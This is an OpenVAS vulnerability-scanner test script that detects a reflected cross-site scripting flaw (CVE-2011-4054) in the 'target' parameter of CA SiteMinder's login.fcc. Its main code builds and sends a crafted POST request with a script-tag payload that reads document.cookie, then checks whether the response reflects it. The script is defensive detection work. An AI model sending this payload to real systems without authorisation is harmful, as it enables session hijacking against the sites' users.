##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ca_siteminder_target_param_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# CA SiteMinder 'target' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "CA SiteMinder R6 SP6 CR7 and earlier
  CA SiteMinder R12 SP3 CR8 and earlier";
tag_insight = "The flaw is due to improper validation of user-supplied input passed
  to the 'target' POST parameter in login.fcc (when 'postpreservationdata' is
  set to 'fail'), which allows attackers to execute arbitrary HTML and script
  code in a user's browser session in the context of an affected site.";
tag_solution = "Upgrade to CA SiteMinder R6 SP6 CR8, R12 SP3 CR9 or later.
  https://support.ca.com/irj/portal/anonymous/phpsupcontent?contentID={A7DA8AC2-E9B4-4DDE-B828-098E0955A344}";
tag_summary = "This host is running CA SiteMinder and is prone to cross-site
  scripting vulnerability.";

if(description)
{
  script_id(902800);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4054");
  script_bugtraq_id(50962);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-19 16:16:16 +0530 (Mon, 19 Dec 2011)");
  script_name("CA SiteMinder 'target' Parameter Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77570");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47167");
  script_xref(name : "URL" , value : "http://securitytracker.com/id/1026394");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/713012");
  script_xref(name : "URL" , value : "https://support.ca.com/irj/portal/anonymous/phpsupcontent?contentID={A7DA8AC2-E9B4-4DDE-B828-098E0955A344}");

  script_description(desc);
  script_summary("Check if CA SiteMinder is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(! host){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("/siteminderagent", "/siteminder", cgi_dirs()))
{
  ## Send and Receive the response
  url = dir + "/forms/login.fcc";
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application before trying exploit
  if("<title>SiteMinder" >< res)
  {
    ## Construct attack request
    postData = 'postpreservationdata=fail&target="><script>alert(document.' +
               'cookie)</script><"';
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData);

    ## Send crafted POST request and receive the response
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    ## Confirm exploit worked by checking the response
    if('><script>alert(document.cookie)</script>' >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
